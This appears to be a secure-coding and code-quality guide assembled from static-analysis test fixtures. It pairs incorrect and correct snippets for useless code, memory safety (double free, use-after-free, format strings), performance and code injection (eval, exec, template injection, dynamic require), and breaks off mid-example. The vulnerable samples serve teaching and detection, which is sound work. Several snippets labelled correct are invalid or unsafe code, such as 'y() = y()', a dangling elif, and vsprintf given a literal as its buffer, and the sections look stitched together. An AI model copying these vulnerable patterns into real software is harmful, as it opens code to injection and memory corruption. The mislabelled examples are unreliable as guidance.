**Message:** Useless if statement; both blocks have the same body

This rule detects if-else statements where both branches execute identical code.

**References:**

- https://docs.python.org/3/tutorial/controlflow.html

**Incorrect code: hard to maintain**

```python
# ruleid: useless-if-body
if a:
    print('1')
else:
    print('1')
```

---

**Severity:** WARNING

**Message:** `return` only makes sense inside a function

This rule detects return statements that appear outside of any function definition.

**Incorrect code: hard to maintain**

```python
def resolve(key: str) -> str:
    key = os.path.join(path, "keys", key)
    # ok: code-after-unconditional-return
    return key, key

# ruleid: return-not-in-function
return (a, b)
```

**Correct code: maintainable**

```python
def resolve(key: str):
    key = os.path.join(path, "keys", key)
    # ok: code-after-unconditional-return
    return key


def resolve(key: str) -> str:
    key = os.path.join(path, "keys", key)
    # ok: code-after-unconditional-return
    return key
```

---

**Severity:** INFO

**Message:** key `$Y` in `$X` is assigned twice; the first assignment is useless

This rule detects consecutive assignments to the same dictionary key, where the first assignment is immediately overwritten.

**Incorrect code: hard to maintain**

```python
d = {}
z = {}
a = {}
for i in xrange(100):
    # ruleid: useless-assignment-keyed
    d[i] = z[i]
    d[i] = z[i]
    d[i+1] = z[i]

    for i in xrange(100):
        # ruleid: useless-assignment-keyed
        da[i*1][j] = z[i]
        da[i*1][j] = z[i]
        da[i*4] = z[i]
```

**Correct code: maintainable**

```python
# ok for this rule
x = 5
x = 5

x = y
x = y()

y() = y()
```

---

**Severity:** ERROR

**Message:** function `$FF` is defined inside a function but never used

This rule detects inner functions that are defined but never called or returned.

**Incorrect code: hard to maintain**

```python
def A():
    print_error('test')

    # ruleid:useless-inner-function
    def B():
        print_error('again')

    # ruleid:useless-inner-function
    def C():
        print_error('another')
    return None
```

**Correct code: maintainable**

```python
def A():
    print_error('test')

    # ok:useless-inner-function
    def B():
        print_error('again')

    # ok:useless-inner-function
    def C():
        print_error('another')

    # ok:useless-inner-function
    @something
    def D():
        print_error('with decorator')

    return B(), C()

def foo():
    # ok:useless-inner-function
    def bar():
        print("hi mom")
    return bar

def dec(f):
    # ok:useless-inner-function
    def inner(*args, **kwargs):
        return f(*args, **kwargs)
    result = other_dec(inner)
    return result
```

---

**Severity:** WARNING

**Message:** Is "$FUNC" a function or an attribute? If it is a function, you may have meant $X.$FUNC() because $X.$FUNC is always true.

This rule detects when a method starting with `is_` is referenced without being called, which is usually a bug.

**Incorrect code: hard to maintain**

```python
class MyClass:
  some_attr = 3
  def is_positive(self):
    return self.some_attr > 0

example = MyClass()
# ruleid:is-function-without-parentheses
if (example.is_positive):
  do_something()
```

**Correct code: maintainable**

```python
class MyClass:
  some_attr = 3
  def is_positive(self):
    return self.some_attr > 0

example = MyClass()
# ok:is-function-without-parentheses
example.is_positive()
# ok:is-function-without-parentheses
elif (example.some_attr):
  do_something_else()
else:
  return
```

---

**Severity:** WARNING

**Message:** deprecated Flask API

This rule detects usage of deprecated Flask APIs that should be replaced with modern alternatives.

**Incorrect code: hard to maintain**

```python
from flask import Flask, json_available, request, testing

# ruleid: flask-deprecated-apis
app = Flask(__name__)

# ruleid: flask-deprecated-apis
if json_available:
    pass

# ruleid: flask-deprecated-apis
blueprint = request.module

# ruleid: flask-deprecated-apis
builder = testing.make_test_environ_builder(app)

# ruleid: flask-deprecated-apis
app.open_session(...)

# ruleid: flask-deprecated-apis
app.save_session(...)

# ruleid: flask-deprecated-apis
app.make_null_session(...)

# ruleid: flask-deprecated-apis
app.init_jinja_globals(...)

# ruleid: flask-deprecated-apis
app.request_globals_class(...)

# ruleid: flask-deprecated-apis
app.static_path(...)

# ruleid: flask-deprecated-apis
app.config.from_json(...)
```

**Correct code: maintainable**

```python
from flask import Flask, request

app = Flask(__name__)

@app.route("/foo")
def foo():
    pass


if request.method == "POST":
    pass

app.config["BAR"] = "BAZ"
app.register_blueprint(blueprint=object())
```

---

**Severity:** WARNING

**Message:** Detected an if block that checks for the same condition on both branches (`$X`). The second condition check is useless as it is the same as the first, and therefore can be removed from the code.

**Incorrect code: hard to maintain**

```go
package main

import "fmt"

func main() {
	fmt.Println("hello world")
	var y = 1

	// ruleid:useless-if-conditional
	if y {
		fmt.Println("of course")
	} else if y {
		fmt.Println("of course other thing")
	}

	// ruleid:useless-if-body
	if y {
		fmt.Println("of course")
	} else {
		fmt.Println("of course")
	}
}
```

**Correct code: maintainable**

```go
package main

import "fmt"

func main() {
	fmt.Println("hello world")
	var y = 1

	if y {
		fmt.Println("of course")
	}

	fmt.Println("of course2")
	fmt.Println(1)
	fmt.Println(2)
	fmt.Println(3)
	fmt.Println("of course2")
}
```

### 0.7 Ensure Memory Safety

**Impact: CRITICAL**

Memory safety vulnerabilities are among the most critical security issues in software development. They can lead to arbitrary code execution, data corruption, denial of service, and information disclosure. This guide covers common memory safety issues including buffer overflows, use-after-free, double-free, format string vulnerabilities, and out-of-bounds memory access.

**Incorrect: C - double free vulnerability, CWE-415**

```c
int bad_code1() {
    char *var = malloc(sizeof(char) * 10);
    free(var);
    // ruleid: double-free
    free(var);
    return 0;
}
```

**Correct: C - set pointer to NULL after free**

```c
int okay_code1() {
    char *var = malloc(sizeof(char) * 10);
    free(var);
    var = NULL;
    // ok: double-free
    free(var);
    return 0;
}

int okay_code2() {
    char *var = malloc(sizeof(char) * 10);
    free(var);
    var = malloc(sizeof(char) * 10);
    // ok: double-free
    free(var);
    return 0;
}
```

**Incorrect: C - use after free vulnerability, CWE-416**

```c
typedef struct name {
    char *myname;
    void (*func)(char *str);
} NAME;

int bad_code1() {
    NAME *var;
    var = (NAME *)malloc(sizeof(struct name));
    free(var);
    // ruleid: use-after-free
    var->func("use after free");
    return 0;
}

int bad_code2() {
    NAME *var;
    var = (NAME *)malloc(sizeof(struct name));
    free(var);
    // ruleid: use-after-free
    other_func(var->myname);
    return 0;
}

int bad_code3(){
    struct NAME *var;
    var = malloc(sizeof(s_auth));
    free(var);
    // ruleid: use-after-free
    if(var->auth){
        printf("you have logged in already");
    }
    else{
        printf("you do not have the permision to log in.");
    }
    return 0;
}

int bad_code4(){
    int initial = 1000;
    struct lv *lv = malloc(sizeof(*lv));
    lv->length = initial;
    lv->value = malloc(initial);
    free(lv);
    // ruleid: use-after-free
    free(lv->value);
    return 0;
}

int bad_code6() {
    NAME *var;
    var = (NAME *)malloc(sizeof(struct name));
    free(var);
    // ruleid: use-after-free
    (*var).func("use after free");
    return 0;
}

int bad_code7() {
    char *var;
    char buf[10];
    var = (char *)malloc(100);
    free(var);
    // ruleid: use-after-free
    char buf[0] = var[0];
    return 0;
}
```

**Correct: C - safe use after free patterns**

```c
int okay_code1() {
    NAME *var;
    var = (NAME *)malloc(sizeof(struct name));
    free(var);
    var = NULL;
    // This will segmentation fault
    // ok: use-after-free
    var->func("use after free");
    return 0;
}

int okay_code2() {
    NAME *var;
    var = (NAME *)malloc(sizeof(struct name));
    free(var);
    var = NULL;
    // This will segmentation fault
    // ok: use-after-free
    other_func(var->myname);
    return 0;
}

int ok_code4(){
    int initial = 1000;
    struct lv *lv = malloc(sizeof(*lv));
    lv->length = initial;
    lv->value = malloc(initial);
    // ok: use-after-free
    free(lv->value);
    // ok: use-after-free
    free(lv);
    return 0;
}

int ok_code6() {
    NAME *var;
    var = (NAME *)malloc(sizeof(struct name));
    free(var);
    var = (NAME *)malloc(sizeof(struct name));
    // ok: use-after-free
    (*var).func("use after free");
    return 0;
}
```

**Incorrect: C - function use after free, CWE-416**

```c
typedef struct name {
    char *myname;
    void (*func)(char *str);
} NAME;

int bad_code1() {
    NAME *var;
    char buf[10];
    var = (NAME *)malloc(sizeof(struct name));
    free(var);
    // ruleid: function-use-after-free
    strcpy(buf, (char*)var);
    // ruleid: function-use-after-free
    other_func((char*)(*var));
    // ruleid: function-use-after-free
    other_func((char*)var[0]);
    // ruleid: function-use-after-free
    var->func(var->myname);
    return 0;
}

int bad_code2() {
    NAME *var;
    char buf[10];
    var = (NAME *)malloc(sizeof(struct name));
    free(var);
    // ruleid: function-use-after-free
    strcpy(buf, (char*)*var);
    // ruleid: function-use-after-free
    other_func((char*)var);
    // ruleid: function-use-after-free
    other_func((char*)var->myname);
    return 0;
}
```

**Correct: C - safe function use after free patterns**

```c
int okay_code1() {
    NAME *var;
    var = (NAME *)malloc(sizeof(struct name));
    free(var);
    var = NULL;
    // This will segmentation fault
    // ok: function-use-after-free
    other_func((char*)var);
    other_func((char*)var->myname);
    other_func((char*)*var);
    return 0;
}

int okay_code2() {
    NAME *var;
    var = (NAME *)malloc(sizeof(struct name));
    free(var);
    var = NULL;
    var = (NAME *)malloc(sizeof(struct name));
    // This will segmentation fault
    // ok: function-use-after-free
    other_func((char*)var);
    other_func((char*)var->myname);
    other_func((char*)*var);
    return 0;
}
```

**Incorrect: C - insecure format string functions, CWE-134**

```c
void bad_vsprintf(int argc, char **argv) {
    char format[256];

    //ruleid: insecure-use-printf-fn
    strncpy(format, argv[1], 255);
    char buffer[100];
    vsprintf (buffer,format, args);

    //ruleid: insecure-use-printf-fn
    vsprintf(buffer, argv[1], args);
}

void bad_sprintf(int argc, char **argv) {
    char format[256];

    int a = 10, b = 20, c=30;
    //ruleid: insecure-use-printf-fn
    strcpy(format, argv[1]);
    char buffer[200];
    sprintf(buffer, format, a, b, c);


    char buffer[256];
    int i = 3;
    //ruleid: insecure-use-printf-fn
    sprintf(buffer, argv[2], a, b, c);
}

void bad_printf() {
    //ruleid: insecure-use-printf-fn
    printf(argv[2], 1234);

    char format[300];
    //ruleid: insecure-use-printf-fn
    strcpy(format, argv[1]);
    printf(format, 1234);
}
```

**Correct: C - safe format string usage**

```c
void safe_vsprintf(int argc, char **argv) {
    //ok: insecure-use-printf-fn
    vsprintf("%s\n",argv[0]);

    //ok: insecure-use-printf-fn
    vsnprintf(buffer, format, args);
}

void safe_sprintf(int argc, char **argv) {
    //ok: insecure-use-printf-fn
    sprintf("%s\n",argv[0]);

    //ok: insecure-use-printf-fn
    snprintf(buffer, format, a,b,c);
}

void safe_printf() {
    //ok: insecure-use-printf-fn
    printf("hello");

    //ok: insecure-use-printf-fn
    printf("%s\n",argv[0]);
}
```

**Incorrect: JavaScript - Buffer noassert out-of-bounds, CWE-119**

```javascript
// ruleid:detect-buffer-noassert
a.readUInt8(0, true)

// ruleid:detect-buffer-noassert
a.writeFloatLE(0, true)
```

**Correct: JavaScript - Buffer with bounds checking**

```javascript
// ok:detect-buffer-noassert
a.readUInt8(0)

// ok:detect-buffer-noassert
a.readUInt8(0, false)
```

**Incorrect: JavaScript - unsafe format string, CWE-134**

```javascript
const util = require('util')

function test1(data) {
  const {user, ip} = data
  foobar(user)
  // ruleid: unsafe-formatstring
  console.log("Unauthorized access attempt by " + user, ip);
}

function test2(data) {
  const {user, ip} = data
  foobar(user)
  const logs = `Unauthorized access attempt by ${user}`
  // ruleid: unsafe-formatstring
  console.log(logs, ip);
}

function test3(data) {
  const {user, ip} = data
  foobar(user)
  const logs = `Unauthorized access attempt by ${user} %d`
  // ruleid: unsafe-formatstring
  return util.format(logs, ip);
}
```

**Correct: JavaScript - safe format string usage**

```javascript
const util = require('util')

function okTest1(data) {
  const {user, ip} = data
  foobar(user)
  const logs = `Unauthorized access attempt by user`
  // ok: unsafe-formatstring
  console.log(logs, ip);
}

function okTest2(data) {
  const {user, ip} = data
  foobar(user)
  // ok: unsafe-formatstring
  console.log("Unauthorized access attempt by " + user);
}

function okTest3(data) {
  const {user, ip} = data
  foobar(user)
  // ok: unsafe-formatstring
  return util.format("Unauthorized access attempt by %d", ip);
}
```

**Incorrect: C# - MemoryMarshal CreateSpan out-of-bounds read, CWE-125**

```csharp
namespace MemMarshalCreateSpan {
    public class MemMarshalCreateSpan {
        public void MarshalTest() {
            // ruleid: memory-marshal-create-span
            Span<T> ToSpan() => MemoryMarshal.CreateSpan(ref _e0, 1);

            // ruleid: memory-marshal-create-span
            Span<T> ToSpan() => MemoryMarshal.CreateReadOnlySpan(ref _e0, 2);

            // ruleid: memory-marshal-create-span
            Span<byte> span = MemoryMarshal.CreateSpan(ref Unsafe.AsRef(writer.Span.GetPinnableReference()), 4);

            // ruleid: memory-marshal-create-span
            Span<byte> span = MemoryMarshal.CreateReadOnlySpan(ref Unsafe.AsRef(writer.Span.GetPinnableReference()), 8);
        }
    }
}
```

**Correct: C# - safe Span creation with bounds checking**

Use standard Span creation methods with bounds checking, or validate the length parameter before calling MemoryMarshal methods.

**Incorrect: PHP - base_convert loses precision, CWE-190**

```php
<?php

// ruleid: base-convert-loses-precision
$token = base_convert(bin2hex(hash('sha256', uniqid(mt_rand(), true), true)), 16, 36);

// ruleid: base-convert-loses-precision
base_convert(hash_hmac('sha256', $command . ':' . $token, $secret), 16, 36);

// ruleid: base-convert-loses-precision
$randString = base_convert(sha1(uniqid(mt_rand(), true)), 16, 36);

// ruleid: base-convert-loses-precision
$uniqueId = substr(base_convert(md5(uniqid(rand(), true)), 16, 36), 1, 20);

// ruleid: base-convert-loses-precision
$token = base_convert(sha1($i),7, 36);

// ruleid: base-convert-loses-precision
$salt = base_convert(bin2hex(random_bytes(20)), 16, 36);

$stringHash = substr(md5($string), 0, 8);
// ruleid: base-convert-loses-precision
base_convert($stringHash, 16, 10);

// ruleid: base-convert-loses-precision
$seed = base_convert(md5(microtime().$_SERVER['DOCUMENT_ROOT']), 16, $numeric ? 10 : 35);

$bytes = random_bytes(32);
// ruleid: base-convert-loses-precision
base_convert(bin2hex($bytes), 16, 36);

// ruleid: base-convert-loses-precision
base_convert(bin2hex(openssl_random_pseudo_bytes(8)), 16, 36);

// ruleid: base-convert-loses-precision
$salt = base_convert(bin2hex($this->security->get_random_bytes(20)), 16,36);
```

**Correct: PHP - safe base_convert usage with small numbers**

```php
<?php

// ok: base-convert-loses-precision
var_dump(base_convert("0775", 8, 10));

// ok: base-convert-loses-precision
$token = 'gleez_profiler/'.base_convert($counter++, 10, 32);

// ok: base-convert-loses-precision
$color1Index = base_convert(substr($uid, 0, 2), 16, 10) % $totalColors;

// ok: base-convert-loses-precision
$id_converted = base_convert($row, 10, 36);

// ok: base-convert-loses-precision
$value = base_convert(substr($value, 2), 16, 10);

// ok: base-convert-loses-precision
base_convert(rand(1, 1000000000), 10, 36);

// taking only 7 hex chars makes it fit into a 64-bit integer
$stringHash = substr(md5($string), 0, 7);
// ok: base-convert-loses-precision
base_convert($stringHash, 16, 10);

// ok: base-convert-loses-precision
base_convert(bin2hex(iconv('UTF-8', 'UCS-4', $m)), 16, 10);

// ok: base-convert-loses-precision
$currentByteBits = str_pad(base_convert(bin2hex(fread($fp,1)), 16, 2),8,'0',STR_PAD_LEFT);

// ok: base-convert-loses-precision
base_convert(bin2hex(random_bytes(7)), 16, 36);
```

**Incorrect: Python/Flask - API method string format injection, CWE-134**

```python
import requests

class FOO(resource):
    method_decorators = decorator()

    # ruleid:flask-api-method-string-format
    def get(self, arg1):
        print("foo")
        string = "foo".format(arg1)
        foo = requests.get(string)

    # ruleid:flask-api-method-string-format
    def get2(self,arg2):
        someFn()
        bar = requests.get("foo".format(arg2))
```

**Correct: Python/Flask - safe API method patterns**

```python
import requests

class FOO(resource):
    method_decorators = decorator()

    # ok:flask-api-method-string-format
    def get(self, somearg):
        createRecord(somearg)

    # ok:flask-api-method-string-format
    def get(self, somearg):
        otherFunc("hello world")
```

### 0.8 Performance Best Practices

**Impact: LOW**

- [Python](#python)

  - [Django](#django)

  - [SQLAlchemy](#sqlalchemy)

- [Ruby](#ruby)

  - [Rails](#rails)

- [C](#c)

- [C#](#c-1)

- [TypeScript/JavaScript](#typescriptjavascript)

  - [React](#react)

- [OCaml](#ocaml)

---

You should use `ITEM.user_id` rather than `ITEM.user.id` to prevent running an extra query. Accessing `.user.id` causes Django to fetch the entire related User object just to get the ID, when the foreign key ID is already available on the model.

- [NLog - How to use structured logging](https://github.com/NLog/NLog/wiki/How-to-use-structured-logging)

- [Benefits of Structured Logging vs Basic Logging](https://softwareengineering.stackexchange.com/questions/312197/benefits-of-structured-logging-vs-basic-logging)

**INCORRECT** - Extra query to fetch related object:**

```python
from django.http import HttpResponse
from models import User


def other():
    # ruleid: access-foreign-keys
    print(User.user.id)
```

**CORRECT** - Use request.user.id which is already loaded:**

```python
from django.http import HttpResponse
from models import User


def cool_view(request):
    # ok: access-foreign-keys
    return HttpResponse({"user_id": request.user.id})


class View(APIView):
    def get_queryset(self):
        # ok: access-foreign-keys
        print(self.request.user.id)
        return super().get_queryset()
```

---

Using `QUERY.count()` instead of `len(QUERY.all())` sends less data to the client since the SQLAlchemy method is performed server-side. The `len(all())` approach fetches all records into memory just to count them.

**INCORRECT** - Fetches all records into memory:**

```python
# ruleid:len-all-count
len(persons.all())
```

**CORRECT** - Count performed server-side:**

```python
# ok:len-all-count
persons.count()
```

Rather than adding one element at a time, consider batch loading to improve performance. Each individual `db.session.add()` in a loop can trigger separate database operations.

**INCORRECT** - Adding one at a time in a loop:**

```python
# ruleid:batch-import
for song in songs:
    db.session.add(song)
```

**CORRECT** - Batch add all at once:**

```python
# ok:batch-import
db.session.add_all(songs)
```

---

Foreign key columns (columns ending in `_id`) should have database indexes to improve query performance. Without an index, queries filtering or joining on foreign keys require full table scans.

**INCORRECT** - Foreign key column without index:**

```ruby
class CreateProducts < ActiveRecord::Migration[7.0]
  def change
    # ruleid: ruby-rails-performance-indexes-are-beneficial
    add_column :users3, :email3_id, :integer, foo: bar
    add_index :users3, [:email2_id, :other_id], name: "asdf"

    # ruleid: ruby-rails-performance-indexes-are-beneficial
    add_column :users4, :email4_id, :integer, { other_stuff: :asdf }

    # ruleid: ruby-rails-performance-indexes-are-beneficial
    add_column :users4, :email4_id, :bigint, { other_stuff: :asdf }
  end
end
```

**CORRECT** - Add index immediately after adding foreign key column:**

```ruby
class CreateProducts < ActiveRecord::Migration[7.0]
  def change
    # ok: ruby-rails-performance-indexes-are-beneficial
    add_column :users, :email_id, :integer
    add_index :users, :email_id

    # ok: ruby-rails-performance-indexes-are-beneficial
    add_column :users2, :email2_id, :integer, foo: :bar
    add_index :users2, :email2_id, name: "asdf"
  end
end
```

---

Using `==` on `char*` performs pointer comparison, not string content comparison. Use `strcmp` instead to compare the actual string values.

**INCORRECT** - Pointer comparison instead of string comparison:**

```c
#include <stddef.h>
#include <string.h>

int main()
{
    char *s = "Hello";

    // ruleid:c-string-equality
    if (s == "World") {
        return -1;
    }

    return 0;
}
```

**CORRECT** - Use strcmp for string content comparison:**

```c
#include <stddef.h>
#include <string.h>

int main()
{
    char *s = "Hello";

    // ok:c-string-equality
    if (strcmp(s, "World") == 0) {
        return 1;
    }

    // ok:c-string-equality
    if (!strcmp(s, "World")) {
        return 1;
    }

    // ok:c-string-equality
    if (s == 0) {
      return 1;
    }

    // ok:c-string-equality
    if (NULL == s) {
      return 1;
    }

    return 0;
}
```

---

String interpolation in log messages obscures the distinction between variables and the log message. Use structured logging instead, where the variables are passed as additional arguments and the interpolation is performed by the logging library. This reduces the possibility of log injection and makes it easier to search through logs.

CWE: CWE-117: Improper Output Neutralization for Logs

**INCORRECT** - String interpolation in log messages:**

```csharp
using Microsoft.Extensions.Logging;
using Serilog;
using NLog;

class Program
{
    public static void SerilogSample()
    {
        using var serilog = new LoggerConfiguration().WriteTo.Console().CreateLogger();

        var position = new { Latitude = 25, Longitude = 134 };
        var elapsedMs = 34;

        // ruleid: structured-logging
        serilog.Information($"Processed {position} in {elapsedMs:000} ms.");
    }

    public static void MicrosoftSample()
    {
        var loggerFactory = LoggerFactory.Create(builder => {
                builder.AddConsole();
            }
        );

        var logger = loggerFactory.CreateLogger<Program>();

        var position = new { Latitude = 25, Longitude = 134 };
        var elapsedMs = 34;

        // ruleid: structured-logging
        logger.LogInformation($"Processed {position} in {elapsedMs:000} ms.");
    }

    public static void NLogSample()
    {
        var logger = NLog.LogManager.Setup().LoadConfiguration(builder => {
            builder.ForLogger().WriteToConsole();
        }).GetCurrentClassLogger();

        var position = new { Latitude = 25, Longitude = 134 };
        var elapsedMs = 34;

        // ruleid: structured-logging
        logger.Info($"Processed {position} in {elapsedMs:000} ms.");

        // try with different name
        var _LOG = logger;

        // ruleid: structured-logging
        _LOG.Info($"Processed {position} in {elapsedMs:000} ms.");
    }
}
```

**CORRECT** - Pass variables as structured arguments:**

```csharp
using Microsoft.Extensions.Logging;
using Serilog;
using NLog;

class Program
{
    public static void SerilogSample()
    {
        using var serilog = new LoggerConfiguration().WriteTo.Console().CreateLogger();

        var position = new { Latitude = 25, Longitude = 134 };
        var elapsedMs = 34;

        // ok: structured-logging
        serilog.Information("Processed {@Position} in {Elapsed:000} ms.", position, elapsedMs);
    }

    public static void MicrosoftSample()
    {
        var loggerFactory = LoggerFactory.Create(builder => {
                builder.AddConsole();
            }
        );

        var logger = loggerFactory.CreateLogger<Program>();

        var position = new { Latitude = 25, Longitude = 134 };
        var elapsedMs = 34;

        // ok: structured-logging
        logger.LogInformation("Processed {@Position} in {Elapsed:000} ms.", position, elapsedMs);
    }

    public static void NLogSample()
    {
        var logger = NLog.LogManager.Setup().LoadConfiguration(builder => {
            builder.ForLogger().WriteToConsole();
        }).GetCurrentClassLogger();

        var position = new { Latitude = 25, Longitude = 134 };
        var elapsedMs = 34;

        // ok: structured-logging
        logger.Info("Processed {@Position} in {Elapsed:000} ms.", position, elapsedMs);
    }
}
```

---

By declaring a styled component inside the render method of a React component, you are dynamically creating a new component on every render. This means that React will have to discard and re-calculate that part of the DOM subtree on each subsequent render, instead of just calculating the difference of what changed between them. This leads to performance bottlenecks and unpredictable behavior.

**INCORRECT** - Styled component declared inside function/class:**

```tsx
import styled from "styled-components";

function FunctionalComponent() {
  // ruleid: define-styled-components-on-module-level
  const ArbitraryComponent3 = styled.div`
    color: blue;
  `
  return <ArbitraryComponent3 />
}

function FunctionalComponent2() {
  // ruleid: define-styled-components-on-module-level
  const ArbitraryComponent3 = styled(FunctionalComponent)`
    color: blue;
  `
  return <ArbitraryComponent3 />
}

class ClassComponent {
  public render() {
    // ruleid: define-styled-components-on-module-level
    const ArbitraryComponent4 = styled.div`
        color: blue;
    `
    return <ArbitraryComponent4 />
  }
}
```

**CORRECT** - Styled component declared at module level:**

```tsx
import styled from "styled-components";

// ok: define-styled-components-on-module-level
const ArbitraryComponent = styled.div`
  color: blue;
`
// ok: define-styled-components-on-module-level
const ArbitraryComponent2 = styled(ArbitraryComponent)`
  color: blue;
`

function FunctionalComponent() {
  return <ArbitraryComponent />
}
```

---

Checking `List.length xs = 0` or `List.length xs > 0` is inefficient. `List.length` traverses the entire list to count elements. For checking if a list is empty or non-empty, compare directly against `[]`.

**INCORRECT** - Using List.length for empty check:**

```ocaml
let test xs =
  (* ruleid:ocamllint-length-list-zero *)
  if List.length xs = 0
  then 1
  else 2

let test2 xs =
  (* ruleid:ocamllint-length-more-than-zero *)
  if List.length xs > 0
  then 1
  else 2
```

**CORRECT** - Compare directly against empty list:**

```ocaml
let test xs =
  (* ok:ocamllint-length-list-zero *)
  if xs = []
  then 1
  else 2

let test2 xs =
  (* ok:ocamllint-length-more-than-zero *)
  if xs <> []
  then 1
  else 2
```

Reference: [https://docs.djangoproject.com/en/5.0/topics/db/optimization/#use-foreign-key-values-directly](https://docs.djangoproject.com/en/5.0/topics/db/optimization/#use-foreign-key-values-directly), [https://archive.is/i7SLO](https://archive.is/i7SLO), [https://styled-components.com/docs/faqs#why-should-i-avoid-declaring-styled-components-in-the-render-method](https://styled-components.com/docs/faqs#why-should-i-avoid-declaring-styled-components-in-the-render-method)

### 0.9 Prevent Code Injection

**Impact: CRITICAL**

Code injection vulnerabilities occur when an attacker can insert and execute arbitrary code within your application. This includes direct code evaluation (eval, exec), template injection (SSTI), reflection-based attacks, and dynamic method invocation. These vulnerabilities can lead to complete system compromise, data theft, and remote code execution.

**Incorrect: Python - eval/exec with user input**

```python
# Direct eval with user input - VULNERABLE
def unsafe(request):
    code = request.POST.get('code')
    print("something")
    eval(code)

def unsafe_inline(request):
    eval(request.GET.get('code'))

def unsafe_dict(request):
    eval(request.POST['code'])

# Dynamic string formatting in eval - VULNERABLE
dynamic = "import requests; r = requests.get('{}')"
eval(dynamic.format("https://example.com"))

def eval_something(something):
    eval(something)

user_input = get_userinput()
eval(f"some_func({user_input})")

# exec with user input - VULNERABLE
def unsafe_exec(request):
    code = request.POST.get('code')
    exec(code)

async def run_exec_by_event_loop(request):
    code = request.POST["code"]
    loop = asyncio.get_running_loop()
    await loop.run_in_executor(None, exec, code)
```

**Correct: Python - static eval/exec with hardcoded strings**

```python
# Static eval with hardcoded strings - SAFE
eval("x = 1; x = x + 2")

blah = "import requests; r = requests.get('https://example.com')"
eval(blah)

def safe(request):
    code = """
    print('hello')
    """
    eval(dedent(code))

# Static exec with hardcoded strings - SAFE
exec("x = 1; x = x + 2")

blah1 = "import requests; r = requests.get('https://example.com')"
exec(blah1)
```

**Incorrect: Python - globals/locals with user input**

```python
def test1(request):
    forward = request.GET.get('fwd')
    globs = globals()
    # Attacker can access any global function
    function = globs.get(forward)

    if function:
        return function(request)

def test2(request):
    forward = request.GET.get('fwd')
    # Attacker can access local scope
    function = locals().get(forward)

def test3(request):
    forward = request.GET.get('fwd')
    # Direct __globals__ access is dangerous
    function = test1.__globals__[forward]
```

**Correct: Python - static globals/locals key lookup**

```python
def okTest():
    # Static key lookup is safe
    function = locals().get("test3")

    if function:
        return function(request)

def okTest2(data):
    # Using globals with static keys is safe
    list_of_globals = globals()
    list_of_globals["foobar"].update(data)
```

**Incorrect: Python - Flask/Django template injection**

```python
# Flask SSTI - VULNERABLE
@app.route("/error")
def error(e):
    template = '''{  extends "layout.html"  }
{  block body  }
    <div class="center-content error">
        <h1>Oops! That page doesn't exist.</h1>
        <h3>%s</h3>
    </div>
{  endblock  }
'''.format(request.url)
    return flask.render_template_string(template), 404

# Using locals()/globals() as template context - VULNERABLE
def bad1(request):
    response = render(request, 'vulnerable/xss/form.html', locals())
    return response

def bad2(request, path='default'):
    env = globals()
    return render(request, 'vulnerable/xss/path.html', env)
```

**Correct: Python - passing specific variables to templates**

```python
# Pass specific variables, not entire scope - SAFE
def file_access(request):
    msg = request.GET.get('msg', '')
    return render(request, 'vulnerable/injection/file_access.html',
            {'msg': msg})
```

**Incorrect: Python - AWS Lambda code execution**

```python
def handler(event, context):
    dynamic1 = "import requests; r = requests.get('{}')"
    # User-controlled event data in exec - VULNERABLE
    exec(dynamic1.format(event['url']))

    dynamic2 = "import requests; r = requests.get('{}')"
    # User-controlled event data in eval - VULNERABLE
    eval(dynamic2.format(event['url']))
```

**Correct: Python - AWS Lambda with static strings**

```python
def handler(event, context):
    # Static strings are safe
    exec("x = 1; x = x + 2")

    blah1 = "import requests; r = requests.get('https://example.com')"
    exec(blah1)
```

**Incorrect: JavaScript - browser eval with dynamic content**

```javascript
let dynamic = window.prompt() // arbitrary user input

// Dynamic content in eval - VULNERABLE
eval(dynamic + 'possibly malicious code');

eval(`${dynamic} possibly malicious code`);

eval(dynamic.concat(''));

function evalSomething(something) {
    eval(something);
}

// Template literals with user input - VULNERABLE
window.eval(`alert('${location.href}')`)

let funcName = new URLSearchParams(window.location.search).get('a')
var x = new Function(`return ${funcName}(a,b)`)
```

**Correct: JavaScript - static eval strings**

```javascript
// Static strings are safe
eval('var x = "static strings are okay";');

const constVar = "function staticStrings() { return 'static strings are okay';}";
eval(constVar);

// Concatenating constants is safe
eval(`${constVar}`);

const secondConstVar = 'this is a const variable';
eval(constVar + secondConstVar);
```

**Incorrect: JavaScript - Express request data in eval**

```javascript
function test1(req,res) {
  const data = JSON.stringify(req.query.key);
  const command = `(secret) => {${data}}`
  // Request data flows to eval - VULNERABLE
  return eval(command)
}

test2.post(foo, bar, function (req,res) {
  userInput = req.params.input
  var command = "new Function('"+userInput+"')";
  return eval(command)
});
```

**Correct: JavaScript - static command in eval**

```javascript
function ok1(req,res) {
  var command = "eval('123')";
  // Static command is safe
  return eval(command)
}
```

**Incorrect: JavaScript - unsafe dynamic method invocation**

```javascript
function test1(data) {
  const message = JSON.parse(data);
  // Attacker controls which function is called - VULNERABLE
  window[message.name](message.payload);
}

function test2(data) {
  const message = JSON.parse(data);
  const action = window[message.name];
  action(message.payload);
}
```

**Correct: JavaScript - whitelist check before dynamic call**

```javascript
let api = {
  foo: function () { /* do smth */ },
  bar: function () { /* do smth */ }
}

function okTest1(data) {
  const message = JSON.parse(data);
  // Whitelist check before dynamic call - SAFE
  if (!api.hasOwnProperty(message.name)) {
    return;
  }
  api[message.name](message.payload);
}

function okTest2(data) {
  // Static property access is safe
  const result = api["foo"](data);
}
```

**Incorrect: JavaScript - non-literal require**

```javascript
function dynamicRequire1(packageName) {
    // User controls which module is loaded - VULNERABLE
    var a = require(packageName)
    return a;
}

function dynamicRequire2(source, file) {
    require(path.resolve(process.cwd(), file, source));
}
```

**Correct: JavaScript - static require**

```javascript
function okDynamicRequire4(userInput) {
    // Static string is safe
    var a = require('b')
}

function okDynamicRequire5(userInput) {
    // Environment variables are generally safe
    var a = require(process.env.VAR)
}
```

**Incorrect: JavaScript - Node.js VM module injection**

```javascript
const vm = require('vm')

exports.handler = async (event) => {
    var input = event['something']
    var sandbox = {
        foo: input
    }
    // Tainted sandbox - VULNERABLE
    vm.runInNewContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })

    const code = `
        var x = ${event['something']};
    `
    // Tainted code - VULNERABLE
    vm.runInThisContext(code)

    // Tainted script - VULNERABLE
    const script = new vm.Script(`
        function add(a, b) {
          return a + ${event['something']};
        }
    `);
    script.runInThisContext();
}
```

**Correct: JavaScript - static VM sandbox and code**

```javascript
const vm = require('vm')

exports.handler = async (event) => {
    // Static sandbox - SAFE
    var sandbox2 = {
        foo: 1
    }
    vm.createContext(sandbox2)
    vm.runInContext('safeEval(orderLinesData)', sandbox2, { timeout: 2000 })

    const code2 = `
